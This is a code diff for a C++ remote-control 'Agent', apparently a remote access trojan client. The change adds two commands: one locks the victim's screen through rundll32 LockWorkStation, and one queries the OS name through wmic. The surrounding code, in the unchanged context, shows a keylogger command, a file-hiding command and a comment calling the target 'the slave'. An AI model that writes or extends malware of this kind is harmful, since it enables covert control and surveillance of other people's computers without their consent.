@@ -478,6 +478,16 @@ void Agent::stop() {
 	}
 }
 
+void Agent::LockScreen() {
+	run_command("rundll32.exe user32.dll,LockWorkStation");
+	send_output("Screen is now locked");
+}
+
+void Agent::GetOS() {
+	run_command("wmic os get name");
+}
+
+
 void Agent::execute(const std::string& commandline) {
 	string command = commandline.substr(0, commandline.find(" "));
 	string args = commandline.substr(commandline.find(" ") + 1);
@@ -528,6 +538,14 @@ void Agent::execute(const std::string& commandline) {
 	// hide of unhide a file
 	else if (command == "hide_unhide") {
 		hide_unhide_file(args);
+	}
+	// get just the os name
+	else if (command == "getos") {
+		GetOS();
+	}
+	// Lock the screen of the slave
+	else if (command == "lockscreen") {
+		LockScreen();
 	}
 	// start or stop the keylogger
 	else if (command == "keylogger") {
